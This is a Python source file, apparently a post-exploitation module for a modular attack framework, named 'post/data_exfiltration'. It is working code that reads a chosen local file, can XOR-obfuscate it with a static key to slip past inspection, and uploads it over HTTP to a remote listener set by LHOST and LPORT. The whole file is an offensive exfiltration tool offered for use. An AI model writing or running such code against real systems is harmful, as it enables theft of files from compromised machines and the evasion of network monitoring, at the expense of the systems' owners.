import requests
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/data_exfiltration',
        'description': 'Exfiltrate local files to a remote listener via HTTP.',
        'options': {
            'LHOST': 'Remote listener IP address',
            'LPORT': 'Remote listener port [default: 8080]',
            'FILE_PATH': 'Path to the local file to exfiltrate',
            'USE_XOR': 'Apply XOR obfuscation before sending [default: false]'
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        lhost = self.framework.options.get('LHOST')
        lport = self.framework.options.get('LPORT', 8080)
        file_path = self.framework.options.get('FILE_PATH')
        use_xor = self.framework.options.get('USE_XOR', 'false').lower() == 'true'

        if not lhost or not file_path:
            console.print("[red][!] LHOST and FILE_PATH are required.[/red]")
            return

        path = Path(file_path)
        if not path.exists():
            console.print(f"[red][!] File not found: {file_path}[/red]")
            return

        url = f"http://{lhost}:{lport}/upload"
        console.print(f"[*] Exfiltrating [cyan]{file_path}[/cyan] to [yellow]{url}[/yellow]...")

        try:
            with open(path, 'rb') as f:
                data = f.read()

            if use_xor:
                console.print("[*] Applying XOR obfuscation...")
                data = bytes([b ^ 0x42 for b in data]) # Static key for simplicity

            response = requests.post(url, files={'file': (path.name, data)}, timeout=10)
            
            if response.status_code == 200:
                console.print("[green][+] Exfiltration successful![/green]")
                log_action(f"Exfiltrated {file_path} to {url}")
            else:
                console.print(f"[red][!] Exfiltration failed (Status {response.status_code}): {response.text}[/red]")

        except Exception as e:
            console.print(f"[red][!] Exfiltration error: {e}[/red]")
            log_action(f"Exfiltration error for {file_path}: {e}", level="ERROR")
